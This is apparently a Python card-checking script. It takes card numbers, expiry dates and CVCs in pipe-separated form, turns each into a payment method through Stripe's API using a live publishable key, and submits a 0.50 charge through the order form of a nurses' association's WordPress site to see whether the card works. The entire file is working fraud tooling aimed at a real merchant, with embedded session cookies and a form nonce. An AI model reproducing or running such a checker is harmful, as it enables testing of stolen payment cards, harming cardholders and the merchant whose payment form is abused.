import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F39de0b7336%3B+stripe-js-v3%2F39de0b7336%3B+card-element&key=pk_live_51PQJl0Rr4XSwUqgRgkZ4nUXxhwt0HHBAWd4OJ1VU1FrT8jDmEXWbgW47CQnNo8r928hVrXpYmJ7E3c0TDvXGoboa004mWcAVAz'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': 'e8f0f4d9-fc0d-4355-a453-00edebe0a6726b1e7b',
	    '__stripe_sid': '4bff58ec-deb4-4bad-965b-2df54bc8c6b4cfe59c',
	}
	
	headers = {
	    'authority': 'illinoisnurses.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=e8f0f4d9-fc0d-4355-a453-00edebe0a6726b1e7b; __stripe_sid=4bff58ec-deb4-4bad-965b-2df54bc8c6b4cfe59c',
	    'origin': 'https://illinoisnurses.com',
	    'referer': 'https://illinoisnurses.com/order-ina-swag/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1741172361047',
	}
	
	data = 'data=__fluent_form_embded_post_id%3D14261%26_fluentform_9_fluentformnonce%3Dbad403ac56%26_wp_http_referer%3D%252Forder-ina-swag%252F%26payment_input%3D20%26item-quantity%3D%26payment_input_1%3D60%26item-quantity_1%3D%26payment_input_3%3D25%26item-quantity_3%3D%26payment_input_2%3D70%26item-quantity_2%3D%26names%255Bfirst_name%255D%3DRodam%26names%255Blast_name%255D%3DUser%26address_1%255Baddress_line_1%255D%3DStreet%252027%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNew%2520York%26address_1%255Bzip%255D%3D10080%26phone%3D0817480671%26email%3Drodamuser20%2540gmail.com%26dropdown_5%3DCity%2520of%2520Chicago%26input_radio_3%3DI%2520would%2520like%2520these%2520items%2520to%2520be%2520shipped%2520to%2520me%2520(%25245%2520per%2520item).%26custom-payment-amount%3D0.50%26input_radio_2%3DShip%2520to%2520the%2520above%2520address%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=9'
	
	r2 = requests.post(
	    'https://illinoisnurses.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
